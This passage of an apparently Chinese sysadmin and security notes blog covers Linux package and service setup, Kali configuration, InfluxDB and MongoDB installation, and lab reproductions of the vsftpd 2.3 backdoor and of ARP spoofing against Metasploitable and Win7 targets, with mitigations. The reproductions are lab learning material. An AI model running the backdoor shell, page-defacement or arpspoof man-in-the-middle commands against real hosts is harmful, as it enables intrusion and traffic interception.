00:0c:29:19:f4:ac))&#x27;</span> -c 10</code></pre><h2 id="包管理工具"><a href="#包管理工具" class="headerlink" title="包管理工具"></a>包管理工具</h2><h3 id="rpm"><a href="#rpm" class="headerlink" title="rpm"></a>rpm</h3><pre><code class="hljs bash"><span class="hljs-comment"># rpm五大功能：安装（-i）、卸载（-e）、升级(-u)、查询(-qa(所有rpm包| -ql(已安装的软件包))、验证(-qf) </span>rpm -qa <span class="hljs-comment"># 查询系统上的rpm包</span></code></pre><h2 id="服务vsftpd"><a href="#服务vsftpd" class="headerlink" title="服务vsftpd"></a>服务vsftpd</h2><h3 id="安装-卸载vsftpd"><a href="#安装-卸载vsftpd" class="headerlink" title="安装&amp;卸载vsftpd"></a>安装&amp;卸载vsftpd</h3><pre><code class="hljs bash"><span class="hljs-comment"># yum</span><span class="hljs-comment"># http://rpmfind.net/</span><span class="hljs-comment"># wget https://rpmfind.net/linux/mageia/distrib/8/x86_64/media/core/release/vsftpd-3.0.3-11.mga8.x86_64.rpm</span>yum repolist <span class="hljs-comment"># 查看镜像源</span>yum search vsftpd <span class="hljs-comment"># 查看vsftpd软件包</span>yum install vsftpd <span class="hljs-comment"># 安装vsftpd软件</span>yum remove vsftpd <span class="hljs-comment"># 卸载vsftpd软件</span>yum autoremove <span class="hljs-comment"># 卸载残留</span>yum clear all</code></pre><h3 id="配置vsftpd"><a href="#配置vsftpd" class="headerlink" title="配置vsftpd"></a>配置vsftpd</h3><pre><code class="hljs bash"><span class="hljs-comment"># /etc/vsftpd/vsftpd.conf</span>anonymous_enable=NOchroot_local_user=YESchroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_listlisten=YESlisten_ipv6=NO<span class="hljs-comment"># </span>useradd ftpuserpasswd ftpuservim  /etc/vsftpd/user_list <span class="hljs-comment"># 添加ftpuser</span><span class="hljs-comment"># systemctl restart vsftpd</span>netstat -anpt  <span class="hljs-comment"># 查看21端口</span></code></pre><h3 id="使用vsftpd"><a href="#使用vsftpd" class="headerlink" title="使用vsftpd"></a>使用vsftpd</h3><pre><code class="hljs bash"><span class="hljs-comment"># 客户端</span>yum install ftpsftp ftpuser@192.168.16.101get filename <span class="hljs-comment"># 下载</span>put filename <span class="hljs-comment"># 上传</span></code></pre><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><h3 id="常见ARP命令"><a href="#常见ARP命令" class="headerlink" title="常见ARP命令"></a>常见ARP命令</h3><pre><code class="hljs bash"><span class="hljs-comment"># windows</span>arp -aarp -d <span class="hljs-comment"># 清除arp记录</span>arp -d xx-xx-xx-xx-xx-xx <span class="hljs-comment"># 删除arp记录</span><span class="hljs-comment"># PC上绑定网关的mac地址</span>arp -s 192.168.16.2 xx-xx-xx-xx-xx-xx</code></pre><hr><h1 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h1><h2 id="Centos7安装-配置"><a href="#Centos7安装-配置" class="headerlink" title="Centos7安装&amp;配置"></a>Centos7安装&amp;配置</h2><h3 id="Centos7安装"><a href="#Centos7安装" class="headerlink" title="Centos7安装"></a>Centos7安装</h3><pre><code class="hljs">复制代码</code></pre><h3 id="Centos7更换源"><a href="#Centos7更换源" class="headerlink" title="Centos7更换源"></a>Centos7更换源</h3><pre><code class="hljs bash"><span class="hljs-comment"># 更换阿里源</span>curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo<span class="hljs-comment"># 清理yum缓存</span>yum clean all<span class="hljs-comment"># 重新生成缓存</span>yum makecache</code></pre><h3 id="Centos7安装常用工具"><a href="#Centos7安装常用工具" class="headerlink" title="Centos7安装常用工具"></a>Centos7安装常用工具</h3><pre><code class="hljs bash"><span class="hljs-comment"># wegt下载，net-tools ifconfig, bind-utils nslookup, vim</span>yum install -y wget net-tools bind-utils vim-enhanced tree</code></pre><h3 id="Centos7关闭selinux"><a href="#Centos7关闭selinux" class="headerlink" title="Centos7关闭selinux"></a>Centos7关闭selinux</h3><pre><code class="hljs bash"><span class="hljs-comment"># 关闭selinux</span><span class="hljs-built_in">cp</span> /etc/selinux/config /etc/selinux/config.bak <span class="hljs-comment"># 备份selinux备份</span>vim /etc/selinux/config <span class="hljs-comment"># 将 enforcing 修改为 disabled </span>getenforce <span class="hljs-comment"># 检查 selinux是否是 disabled 状态</span></code></pre><h3 id="Centos7网络配置"><a href="#Centos7网络配置" class="headerlink" title="Centos7网络配置"></a>Centos7网络配置</h3><pre><code class="hljs bash"><span class="hljs-comment">## ifconfig 命令</span>ifconfig -a <span class="hljs-comment"># 查看所有网络设备</span>ifconfig ens33 <span class="hljs-comment"># ifconfig 加设备名：查询指定设备</span>ifconfig -s <span class="hljs-comment"># 查询网络通讯情况</span>ifconfig ens33:0 192.168.40.178 <span class="hljs-comment"># 给设备添加虚拟网卡（冒号后的0代表虚拟网卡的序号，不能重复）</span>ifconfig ens33 up <span class="hljs-comment"># 启动网卡</span>ifup ens33 <span class="hljs-comment"># 启动网卡</span>ifconfig ens33 down <span class="hljs-comment"># 关闭网卡</span>ifdown ens33 <span class="hljs-comment"># 关闭网卡</span><span class="hljs-comment">## ip 命令</span>ip addr <span class="hljs-comment"># 显示所有设备IP地址</span>ip addr add 192.168.0.150/24 dev ens33 <span class="hljs-comment"># 给指定网卡设备ens33添加IP和掩码，立即生效</span>ip addr del 192.168.0.150/24 dev ens33 <span class="hljs-comment"># 删除ens33上的192.168.0.150 IP信息，立即生效</span>ip <span class="hljs-built_in">link</span> show <span class="hljs-comment"># 显示当前设备情况 ip link</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 down <span class="hljs-comment"># 关闭网卡</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 up <span class="hljs-comment"># 开启网卡</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 name ens32 <span class="hljs-comment"># 修改网卡名称</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 MTU 1320 <span class="hljs-comment"># 修改网卡MTU</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 MAC xx:xx:xx:xx:xx:xx <span class="hljs-comment"># 修改网卡MAC地址</span>ip route show <span class="hljs-comment"># 显示当前路由信息</span>ip route add default via 192.168.0.1 dev ens33 <span class="hljs-comment"># 添加默认路由</span>ip route del default via 192.168.0.1 dev ens33 <span class="hljs-comment"># 删除默认路由</span></code></pre><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><pre><code class="hljs bash">hostname [主机名] <span class="hljs-comment"># 临时修改主机名</span>hostnamectl set-hostname [主机名] <span class="hljs-comment"># 永久修改主机名</span>route -n <span class="hljs-comment"># 查看路由表</span><span class="hljs-comment">## netstat 端口扫描，查看端口是否正常，常见参数如下</span>netstat -anpt <span class="hljs-comment"># 以数字形式显示当前系统中所有的TCP链接信息，同时显示对应的进程信息</span>netstat -antp | grep 22 <span class="hljs-comment"># 查找22端口的信息</span>-a <span class="hljs-comment"># 显示当前主机所有活动的网络链接信息</span>-n <span class="hljs-comment"># 以数字的形式显示相关的主机地址和端口信息</span>-r <span class="hljs-comment"># 显示路由表信息</span>-l <span class="hljs-comment"># 显示处于监听状态的网络链接和端口信息</span>-t <span class="hljs-comment"># 显示tcp协议的信息</span>-u <span class="hljs-comment"># 显示udp协议的信息</span>-p <span class="hljs-comment"># 显示与网络链接相关的进程号，进程名称信息（需要root权限）</span><span class="hljs-comment">## ss 查看系统网络连接情况，获取 socket 统计信息</span>-t <span class="hljs-comment"># 显示tcp协议信息</span>-u <span class="hljs-comment"># 显示udp协议信息</span>-w <span class="hljs-comment"># 套接字</span>-x <span class="hljs-comment"># 内核socket相关信息</span>-l <span class="hljs-comment"># 处于监听装填</span>-a <span class="hljs-comment"># 显示所有网络连接活动</span><span class="hljs-comment">## dig 命令</span>yum install bind-utils <span class="hljs-comment"># Ubuntu上 apt install dnsutils</span>dig www.baidu.com<span class="hljs-comment">## 其他</span><span class="hljs-built_in">who</span> /var/log/wtmp <span class="hljs-comment"># 查看登录记录</span></code></pre><hr><h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><h2 id="Kali安装-配置"><a href="#Kali安装-配置" class="headerlink" title="Kali安装&amp;配置"></a>Kali安装&amp;配置</h2><h3 id="Kali安装"><a href="#Kali安装" class="headerlink" title="Kali安装"></a>Kali安装</h3><pre><code class="hljs bash"><span class="hljs-comment"># 设置中文</span><span class="hljs-built_in">sudo</span> dpkg-reconfigure locales<span class="hljs-comment"># 修改root密码</span><span class="hljs-built_in">sudo</span> -ipassword root<span class="hljs-comment">## root用户视图下，更换kali源仓库为国内</span><span class="hljs-built_in">cd</span> /etc/apt<span class="hljs-built_in">cp</span> sources.list sources.list.bak<span class="hljs-comment"># 阿里源</span>deb https://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="hljs-comment"># apt更新</span>apt update <span class="hljs-comment"># 没有公钥解决方法：sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5</span><span class="hljs-comment"># 解决方法2</span>wget -qO- https://archive.kali.org/archive-key.asc | <span class="hljs-built_in">sudo</span> gpg --dearmor -o /usr/share/keyrings/kali-archive-keyring.gpg<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [signed-by=/usr/share/keyrings/kali-archive-keyring.gpg] https://archive.kali.org/kali kali-rolling main non-free contrib&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list<span class="hljs-comment">## 实用工具</span><span class="hljs-comment"># 检测主机是否存在</span>fping -asg 192.168.112.0/24 -C 1<span class="hljs-comment">## nmap  网络探测和安全审核</span><span class="hljs-comment"># nmap 192.168.112.128</span><span class="hljs-comment"># nmap -sV 192.168.112.128</span><span class="hljs-comment"># nmap -p 1-65535 192.168.112.128</span><span class="hljs-comment"># nmap -p- 192.168.112.128</span></code></pre><hr><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="0001-笑脸漏洞-21-port-vsftpd-2-3"><a href="#0001-笑脸漏洞-21-port-vsftpd-2-3" class="headerlink" title="0001 - 笑脸漏洞 ): (21 port, vsftpd 2.3)"></a>0001 - 笑脸漏洞 ): (21 port, vsftpd 2.3)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre><code class="hljs bash">影响范围：vsftpd 2.3.x及以下版本</code></pre><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><pre><code class="hljs bash"><span class="hljs-comment"># 靶场环境：metasploitable-linux-2.0.0.zip，解压打开，选择“我已复制虚拟机”</span><span class="hljs-comment">## kali</span><span class="hljs-comment"># 1、使用nmap 探活</span>nmap 192.168.16.0/24 <span class="hljs-comment"># 确认有开发ftp 21端口的IP地址</span>nmap -sV 192.168.16.141 <span class="hljs-comment"># 确认对应IP地址对应的ftp版本，V是版本</span><span class="hljs-comment">## 2、使用nc（瑞士小军刀）连接ftp。（aa用户名和aaaa密码随意，:)一定要有）</span><span class="hljs-comment"># 终端1</span>nc 192.168.16.141 21 <span class="hljs-comment"># 21 ftp 端口</span>user aa:)pass aaaa<span class="hljs-comment"># 终端2</span><span class="hljs-built_in">sudo</span> nmap -sS -p 6200 192.168.16.141nc 192.168.16.141 6200 <span class="hljs-comment"># 就可以连接上了，回车输入下面Python命令获取权限</span>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><span class="hljs-comment">## 3、网页篡改</span><span class="hljs-comment"># http://192.168.16.141 是一个静态网页。（靶场自带的）</span>find / -name index.html <span class="hljs-comment"># 查看静态网页的路径</span><span class="hljs-built_in">cd</span> /etc/www<span class="hljs-built_in">cat</span> index.php <span class="hljs-comment"># 确认网站内容和该文件一致</span>wget http://img.k2r2.com/uploads/002/20230625/1618252013.jpg <span class="hljs-comment"># 准备篡改的图片</span><span class="hljs-built_in">mv</span> 1618252013.jpg aa.jpg<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;aa.jpg&quot;&gt;&#x27;</span> &gt;&gt; index.php <span class="hljs-comment"># 篡改网页内容，增加图片</span><span class="hljs-built_in">chmod</span> 777 aa.jpg <span class="hljs-comment"># 修改图片的权限</span></code></pre><h3 id="相关截图如下"><a href="#相关截图如下" class="headerlink" title="相关截图如下"></a>相关截图如下</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828191322246.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828192716427.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828192653371.png" alt="img"></p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><pre><code class="hljs bash">更新vsftpd版本超过2.3.x</code></pre><h2 id="0002-ARP-欺骗攻击（中间人攻击）"><a href="#0002-ARP-欺骗攻击（中间人攻击）" class="headerlink" title="0002 - ARP 欺骗攻击（中间人攻击）"></a>0002 - ARP 欺骗攻击（中间人攻击）</h2><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250906162420333.png" alt="ARP欺骗攻击"></p><p>ARP欺骗攻击</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><pre><code class="hljs bash"><span class="hljs-comment"># 步骤1：</span>欺骗者 -&gt; PC1: 欺骗者一直给PC1发送arp响应，网关IP的Mac地址是欺骗者欺骗者 -&gt; 网关: 欺骗者一直给网关发送arp相应，PC1 IP的MAC地址是欺骗者<span class="hljs-comment"># 步骤2：主机型欺骗</span>PC1 -&gt; 网关：PC1 发送的报文 &#123;dst_ip: <span class="hljs-string">&quot;网关&quot;</span>, src_ip: <span class="hljs-string">&quot;PC1&quot;</span>, dst_mac: <span class="hljs-string">&quot;欺骗者&quot;</span>, src_mac: <span class="hljs-string">&quot;PC1&quot;</span>&#125;网关：看到dst_mac不是自己，直接丢弃欺骗者 -&gt; 网关：欺骗者看到后，将报文修改为：&#123;dst_ip: <span class="hljs-string">&quot;网关&quot;</span>, src_ip: <span class="hljs-string">&quot;PC1&quot;</span>, dst_mac: <span class="hljs-string">&quot;网关&quot;</span>, src_mac: <span class="hljs-string">&quot;欺骗者&quot;</span>&#125;<span class="hljs-comment"># 步骤3：网关型欺骗</span>网关 -&gt; PC1：网关回复的报文 &#123;dst_ip: <span class="hljs-string">&quot;PC1&quot;</span>, src_ip: <span class="hljs-string">&quot;网关&quot;</span>, dst_mac: <span class="hljs-string">&quot;欺骗者&quot;</span>, src_mac: <span class="hljs-string">&quot;网关&quot;</span>&#125;PC1：看到dst_mac不是自己，直接丢弃欺骗者 -&gt; PC1：欺骗者看到后，将报文修改为：&#123;dst_ip: <span class="hljs-string">&quot;PC1&quot;</span>, src_ip: <span class="hljs-string">&quot;网关&quot;</span>, dst_mac: <span class="hljs-string">&quot;PC1&quot;</span>, src_mac: <span class="hljs-string">&quot;欺骗者&quot;</span>&#125;<span class="hljs-comment"># 步骤四：就变为如下图所示，主机A和主机B的逻辑链路就断了。</span>备注：arp记录有失效，失效过了就没有了</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250906164103785.png" alt="img"></p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><pre><code class="hljs bash"><span class="hljs-comment">## 环境准备 Win7 &amp; Kali</span><span class="hljs-comment"># Kali 安装 arpspoof 相关组件</span>apt install dsniff apt install driftnetapt install kali-desktop-core <span class="hljs-comment"># 如果安装dsniff报错，提示缺少这个依赖，需要重启服务，选择“Yes”</span>arpspoof -v<span class="hljs-comment">## 步骤1，探活，只ping一次，</span>fping -asg 192.168.16.0/24 -c 1 <span class="hljs-comment">## 单向欺骗操作：使用网卡 eth0 欺骗PC1 192.168.16.129， 我是 192.168.16.2</span>arpspoof -i eth0 -t 192.168.16.129 192.168.16.2<span class="hljs-comment">## 双向欺骗操作：</span><span class="hljs-comment"># kali允许转发</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/ip_forward<span class="hljs-comment"># kali终端1</span>arpspoof -i eth0 -t 192.168.16.129 -r 192.168.16.2<span class="hljs-comment"># kali终端2: 运行一个窗口 </span>driftnet -i eht0<span class="hljs-comment">## 同步操作2：</span><span class="hljs-comment"># Win7 PC1</span>ping www.baidu.com -t arp -a <span class="hljs-comment"># 查看没有欺骗前的192.168.16.2的mac地址后缀是.59</span></code></pre><h3 id="相关截图如下-1"><a href="#相关截图如下-1" class="headerlink" title="相关截图如下"></a>相关截图如下</h3><p>!(<a href="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250906171443108.png">https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250906171443108.png</a>)</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250906171735213.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250906171812747.png" alt="欺骗后昂立"></p><p>欺骗后昂立</p><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250906171858476.png" alt="欺骗前后网关MAC地变成kali"></p><p>欺骗前后网关MAC地变成kali</p><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250906172142614.png" alt="欺骗时网关的MAC地址变成e3，取消欺骗后变为网关的59"></p><p>欺骗时网关的MAC地址变成e3，取消欺骗后变为网关的59</p><h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><pre><code class="hljs bash"><span class="hljs-comment"># 方法1：PC上绑定网关的mac地址</span>arp -s 192.168.16.2 xx-xx-xx-xx-xx-xx<span class="hljs-comment"># 方法2：交换机上-流量抑制</span>根据实际交换机品牌</code></pre><h2 id="0003"><a href="#0003" class="headerlink" title="0003 -"></a>0003 -</h2><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>InfluxDB</title>
      <link href="/2022/03/14/influxDB/"/>
      <url>/2022/03/14/influxDB/</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><p>InfluxDB时序数据库，可存储物联网检测设备数据。</p><h2 id="1-1-离线安装方式"><a href="#1-1-离线安装方式" class="headerlink" title="1.1 离线安装方式"></a>1.1 离线安装方式</h2><p><strong>1. 下载</strong></p><blockquote><ol><li>官方下载 <a href="https://portal.influxdata.com/downloads">链接</a></li><li>参考教程 <a href="https://www.codeleading.com/article/62764503797/">链接</a></li></ol></blockquote><p><strong>2. 安装</strong></p><blockquote><p>解压后对配置文件 influxdb.conf 进行修改，修改项（红字部分）如下：</p></blockquote><pre><code class="hljs conf"># Change this option to true to disable reporting.reporting-disabled =truebind-address = &quot;:8087&quot;language-conf复制代码</code></pre><p><strong>3. 根据配置文件运行</strong></p><pre><code class="hljs ps1">influxd <span class="hljs-literal">-config</span> influxdb.conflanguage<span class="hljs-literal">-ps1</span>复制代码</code></pre><blockquote><p>验证：在浏览器中打开 <a href="http://localhost:8087/">http://localhost:8087</a></p></blockquote><hr><h2 id="1-2-Docker-安装方式"><a href="#1-2-Docker-安装方式" class="headerlink" title="1.2 Docker 安装方式"></a>1.2 Docker 安装方式</h2><h3 id="1-2-1-安装"><a href="#1-2-1-安装" class="headerlink" title="1.2.1 安装"></a>1.2.1 安装</h3><blockquote><p><a href="https://blog.csdn.net/ron03129596/article/details/109408018">参考连接</a></p></blockquote><p><strong>1. 拉取相关版本镜像</strong></p><pre><code class="hljs shell">docker pull influxdb:1.7.9language-shell复制代码</code></pre><p><strong>2. 使用镜像创建容器</strong></p><pre><code class="hljs shell">docker run -d -p  8083:8083 -p 8086:8086 --name influxdb influxdb:1.7.9language-shell复制代码</code></pre><p><strong>3. 开放防火墙端口[可选]</strong></p><pre><code class="hljs shell">firewall-cmd --zone=public --add-port=8083/tcp --permanentfirewall-cmd --zone=public --add-port=8086/tcp --permanentfirewall-cmd --reloadlanguage-shell复制代码</code></pre><p><strong>4. 进入容器内部</strong></p><pre><code class="hljs shell">docker exec -it influxdb /bin/bashlanguage-shell复制代码</code></pre><hr><h3 id="1-2-2-创建用户"><a href="#1-2-2-创建用户" class="headerlink" title="1.2.2 创建用户"></a>1.2.2 创建用户</h3><p><strong>1. 进入<code>influxdb</code>命令交互模式</strong></p><pre><code class="hljs bash">influx</code></pre><p><strong>2. 创建数据库</strong></p><pre><code class="hljs bash">create database <span class="hljs-built_in">test</span>;show databases;use <span class="hljs-built_in">test</span>;</code></pre><p><strong>3. 创建用户</strong></p><pre><code class="hljs bash">CREATE USER <span class="hljs-string">&quot;hjxstart&quot;</span> WITH PASSWORD <span class="hljs-string">&#x27;123456&#x27;</span> WITH ALL PRIVILEGES;show <span class="hljs-built_in">users</span>;</code></pre><hr><h3 id="1-2-3-配置权限"><a href="#1-2-3-配置权限" class="headerlink" title="1.2.3 配置权限"></a>1.2.3 配置权限</h3><p><strong>1. 安装 vim 命令</strong></p><pre><code class="hljs bash">apt-get updateapt-get install vim</code></pre><p><strong>2. 编辑配置配置文件</strong></p><pre><code class="hljs bash">vim /etc/influxdb/influxdb.conf</code></pre><p><strong>3. 修改[http]处的 auth-enabled 属性为 true</strong></p><pre><code class="hljs bash">[meta]  <span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;/var/lib/influxdb/meta&quot;</span>[data]  <span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;/var/lib/influxdb/data&quot;</span>  engine = <span class="hljs-string">&quot;tsm1&quot;</span>  wal-dir = <span class="hljs-string">&quot;/var/lib/influxdb/wal&quot;</span>[http]  enabled = <span class="hljs-literal">true</span>  bind-address = <span class="hljs-string">&quot;:8086&quot;</span>  auth-enabled = <span class="hljs-literal">true</span>  log-enabled = <span class="hljs-literal">true</span>  write-tracing = <span class="hljs-literal">false</span>  pprof-enabled = <span class="hljs-literal">false</span>  https-enabled = <span class="hljs-literal">false</span></code></pre><p><strong>4. 重启容器</strong></p><pre><code class="hljs shell">docker restart influxdblanguage-shell复制代码</code></pre><hr><h3 id="1-2-4-测试"><a href="#1-2-4-测试" class="headerlink" title="1.2.4 测试"></a>1.2.4 测试</h3><p><strong>1. 进入容器</strong></p><pre><code class="hljs shell">docker exec -it influxdb /bin/bashlanguage-shell复制代码</code></pre><p><strong>2. 进入交互模式</strong></p><pre><code class="hljs shell">influx -username &#x27;hjxstart&#x27; -password &#x27;123456&#x27;language-shell复制代码</code></pre><p><strong>3. 使用数据库</strong></p><pre><code class="hljs shell">use test;language-shell复制代码</code></pre><hr><h3 id="1-2-5-整合-Grafana"><a href="#1-2-5-整合-Grafana" class="headerlink" title="1.2.5 整合 Grafana"></a>1.2.5 整合 Grafana</h3><p><strong>1. 安装 Grafana</strong></p><pre><code class="hljs shell">docker run -d -p 3000:3000 --name=grafana grafana/grafanalanguage-shell复制代码</code></pre><p><strong>2. 开放防火墙端口</strong></p><pre><code class="hljs shell">firewall-cmd --zone=public --add-port=3000/tcp --permanentfirewall-cmd --reloadlanguage-shell复制代码</code></pre><p><strong>3. 访问</strong></p><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">用户名密码默认：admin</span>http://ip:8086language-shell复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB</title>
      <link href="/2022/03/06/MongoDB/"/>
      <url>/2022/03/06/MongoDB/</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h1><h2 id="1-1-离线安装方式-Win"><a href="#1-1-离线安装方式-Win" class="headerlink" title="1.1 离线安装方式 Win"></a>1.1 离线安装方式 Win</h2><ol><li>下载链接</li></ol><blockquote><ol><li>官方下载 <a href="https://www.mongodb.com/try/download/community">链接</a></li><li>其它下载 <a href="http://dl.mongodb.org/dl/win32/x86_64">链接</a></li></ol></blockquote><ol><li>创建目录</li></ol><blockquote><p>文件中创建三个文件夹分别为：data、etc、logs，完整目录为：</p></blockquote><pre><code class="hljs bash">mongodb <span class="hljs-comment">#主文件夹</span>      data <span class="hljs-comment">#用来存在数据库</span>      etc  <span class="hljs-comment">#用来存储配置文件</span>      logs <span class="hljs-comment">#存在mongodb 日志文件</span>      bin <span class="hljs-comment"># mongodb的执行文件</span>      LICENSE-Community.text      MPL-2      README      THIRD-PARTY-NOTICES</code></pre><blockquote><p>etc 目录下编写配置文件 mongo.conf，在文件中添加内容：</p></blockquote><pre><code class="hljs bash">dbpath=D:\mongodb\data <span class="hljs-comment">#数据库路径  </span>logpath=D:\mongodb\logs\mongo.log <span class="hljs-comment">#日志输出文件路径  </span>logappend=<span class="hljs-literal">true</span> <span class="hljs-comment">#错误日志采用追加模式  </span>journal=<span class="hljs-literal">true</span> <span class="hljs-comment">#启用日志文件，默认启用  </span>quiet=<span class="hljs-literal">true</span> <span class="hljs-comment">#这个选项可以过滤掉一些无用的日志信息，若需要调试使用请设置为false  </span>port=27017 <span class="hljs-comment">#端口号 默认为27017</span></code></pre><blockquote><p><code>注意</code>：dbpath 和 logpath。根据实际的路径填写。</p></blockquote><ol><li>配置系统环境变量</li></ol><pre><code class="hljs dos">变量名：MONGODB_HOME变量值：D:\mongodb\bin在<span class="hljs-built_in">PATH</span>添加 <span class="hljs-variable">%MONGODB_HOME%</span>复制代码</code></pre><ol><li>添加 MongoDB 服务</li></ol><pre><code class="hljs ps1">mongod <span class="hljs-literal">--dbpath</span> <span class="hljs-string">&quot;D:\mongodb\data\db&quot;</span> <span class="hljs-literal">--logpath</span> <span class="hljs-string">&quot;D:\mongodb\logs\mongo.log&quot;</span> <span class="hljs-literal">--install</span> <span class="hljs-literal">--serviceName</span> <span class="hljs-string">&quot;MongoDB&quot;</span>language<span class="hljs-literal">-ps1</span>复制代码</code></pre><blockquote><p><code>注意</code>：需要在 data 目录下创建 db 文件。不然启动服务的时候可能会报错</p></blockquote><ol><li>启动服务</li></ol><pre><code class="hljs ps1">net <span class="hljs-built_in">start</span> MongoDBlanguage<span class="hljs-literal">-ps1</span>复制代码</code></pre><hr><h2 id="1-2-Docker-安装方式"><a href="#1-2-Docker-安装方式" class="headerlink" title="1.2 Docker 安装方式"></a>1.2 Docker 安装方式</h2><ol><li>环境</li></ol><blockquote><p>Centos7.9<br>Docker20.10.8<br>Mongo:laster</p></blockquote><ol><li>安装</li></ol><pre><code class="hljs shell">docker run -p 27017:27017 -v /home/docker-data/mongo:/data/db --name mongodb -d mongolanguage-shell复制代码</code></pre><ol><li>代码连接</li></ol><pre><code class="hljs js"><span class="hljs-keyword">const</span> mongoose = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>);mongoose.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;userCreateIndex&#x27;</span>, <span class="hljs-literal">true</span>);<span class="hljs-keyword">class</span> <span class="hljs-title class_">Database</span> &#123;  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">connect</span>();  &#125;  <span class="hljs-title function_">connect</span>(<span class="hljs-params"></span>) &#123;    mongoose      .<span class="hljs-title function_">connect</span>(<span class="hljs-string">&#x27;mongodb://47.241.104.103:27017/blog&#x27;</span>)      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;database connection successful&#x27;</span>);      &#125;)      .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;database connection error: &#x27;</span> + err);      &#125;);  &#125;&#125;<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Database</span>();language-js复制代码</code></pre><h2 id="1-3-Mac-安装"><a href="#1-3-Mac-安装" class="headerlink" title="1.3 Mac 安装"></a>1.3 Mac 安装</h2><ol><li>下载 tgz 包和创建目录</li></ol><pre><code class="hljs bash">mongodb-macos-x86_64-5.0.6.tgz</code></pre><ol><li>解压安装包</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> tar xf mongodb-macos-x86_64-4.4.3.tgz</code></pre><ol><li>修改文件名为’mongodb’</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mv</span> xf mongodb-macos-x86_64-4.4.3 mongodb\</code></pre><ol><li>创建数据和日志目录</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -pv ./mongodb/data/&#123;mongodb_data,mongodb_log&#125;</code></pre><ol><li>新建mongodb.log文件</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim ./mongodb/data/mongodb_log/mongodb.log</code></pre><ol><li>创建配置文件 mongodb.conf</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim ./mongodb/data/mongodb.confport=27017dbpath=./mongodb/data/mongodb_data/logpath=./mongodb/data/mongodb_log/mongodb.logfork=<span class="hljs-literal">true</span>logappend=<span class="hljs-literal">true</span>noauth=<span 